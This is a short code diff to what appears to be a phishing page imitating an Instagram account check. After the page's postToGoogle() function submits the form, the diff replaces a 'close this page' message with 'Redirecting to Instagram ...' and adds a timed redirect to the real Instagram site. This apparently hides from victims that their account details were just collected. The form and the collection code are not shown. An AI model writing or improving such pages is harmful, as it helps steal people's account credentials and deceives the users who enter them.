@@ -129,7 +129,7 @@
           <br/>  
           Your account information has been confirmed!
           <br/><br/>
-          <p style="text-align:center; font-size:13px">You may now close this page</p>
+          <p style="text-align:center; font-size:13px">Redirecting to Instagram ...</p>
           <br/>
     </h3>
 
@@ -204,12 +204,16 @@ function postToGoogle() {
 
                   $('#success-msg').show();
                   $('#form').hide();
-                  
+                  setTimeout(Redirect, 3000);                  
                 }
           });
         
         return false;
 
+}
+
+function Redirect() {
+    window.location.replace('https://www.instagram.com');
 }
 
 </script>
